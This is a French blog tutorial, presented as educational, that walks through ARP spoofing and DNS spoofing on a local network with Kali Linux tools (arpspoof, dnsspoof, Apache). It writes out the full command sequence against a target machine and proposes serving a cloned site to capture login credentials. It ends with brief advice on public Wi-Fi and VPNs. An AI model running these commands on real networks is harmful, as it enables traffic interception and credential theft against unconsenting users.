# Comment un hacker peut vous voler vos credentials en 5 minutes

- Canonical URL: https://leandeep.com/comment-un-hacker-peut-vous-voler-vos-credentials-en-5-minutes/
- Author: Olivier Eeckhoutte
- Published: 2021-04-17T19:00:00+02:00
- Updated: 2021-04-17T19:00:00+02:00
- Language: fr
- Tags: Security
- License: CC BY-NC 4.0 (https://creativecommons.org/licenses/by-nc/4.0/)


On croit toujours que ce sont les autres qui se hacker. "Cela n'arrive qu'aux autres", on se sent protégé derrière son petit écran. Pourtant nous sommes des cibles faciles pour les hackers car parfois il suffit d'exécuter moins d'une dizaine de commandes pour mettre en place des pièges redoutables. Dans cet article, qui a purement **un but pédagogique**, nous allons voir à quel point il est simple de faire croire à quelqu'un qu'il navigue sur le site de son choix alors qu'il a attéri sur un site détenu par un hacker. Encore une fois, cet article a un but pédagogique. Il est strictement interdit d'appliquer cette technique sur des ordinateurs et un réseau dont vous n'êtes pas propriétaire. Vous encourez jusqu'à deux ans d'emprisonnement et 60 000 € d'amende... Ceci étant dit et étant dédouané de toute responsabilité, nous allons voir comment réaliser un Man in the middle en spoofant un DNS et en redirigeant le traffic du navigateur vers un serveur Web. 
Il est selon moi important de comprendre à quel point ces techniques sont simples à mettre en place pour être sensibilisé, être (pourquoi pas) paranoïaque et surtpout pour mieux se protéger. Que diriez-vous si un hacker s'était connecté à votre bancaire car vous lui aviez donné vos identifiants ? 
Et ne croyez pas qu'un simple SMS de validation suffise... Un réseau 4G peut également se faire pirater. Je vous invite à faire des recherches sur les IMSI catchers... Pour 300€ un hacker peut s'en fabriquer un en 2021 et intercepter vos SMS... 

<br/>

# Installation des outils sur Kali Linux

Ouvrir un terminal et installer les packages suivants:
```
sudo apt install dsniff bridge-utils -y
sudo echo 1 > /proc/sys/net/ipv4/forward_ip
```

<br/>

# Configuration du DNS 

N'importe où dans votre machine Kali créer un fichier appelé `spoof_url.txt` et ajouter les URLs que vous souhaitez spoofer.

```
192.168.43.109 www*
192.168.43.109 leandeep.com
```

> `192.168.43.109` est l'adresse IP de ma machine Kali

<br/>

# ARP Spoofing (de votre cible)

Récupérer l'adresse IP de la machine cible. Dans notre exemple, elle a l'IP `192.168.43.5`.
Dans un nouveau terminal, exécuter la commande suivante:

```
sudo -s
arpspoof -t 192.168.43.5 192.168.43.1 && arpspoof -t 192.168.43.1 192.168.43.5 
```

<br/>

# Démarrage du serveur Web sur Kali

Donner au fichier localisé dans `/var/www/html/index.html` le contenu HTML que vous voulez que votre cible voit. 
Example sans intérêt, dont un hacker ne se contentera pas:
```
<h1>Hello World</h1>
```
Puis exécuter la commande suivante: `sudo apache2ctl start`

<br/>

# Démarrage du serveur DNS

```
dnsspoof -f Desktop/spoof_url.txt host 192.168.43.5 and udp port 53
```

<br/>

# Résultat

Sur la machine cible/victime, ouvrez votre navigateur et rendez-vous sur le site que vous avez "spoofé". Vous verrez que le contenu de votre serveur web. **Au lieu d'avoir Hello World, si un hacker avait mis un clone du site que vous vouliez voiret que vous aviez tenté de vous y connecter, il aurait pu récupérer vos credentials.** C'est aussi simple que cela et créer un clone d'un site existant ne prend que quelques minutes. Il suffit de l'aspirer automatiquement avec des outils dédiés à cela et modifier 2 ou 3 choses et c'est tout!

![image](/images/spoof-dns.png)

**La prochaine fois que vous vous connecterez à un réseau publique gratuit, réfléchissez bien à ce que vous faites &#128540;**

Personnellement, j'utilise un secured VPN ou travaille en 4G dès que je sors de chez moi et j'ai sécurisé mon Smartphone pour détecter les fausses bornes 4G.
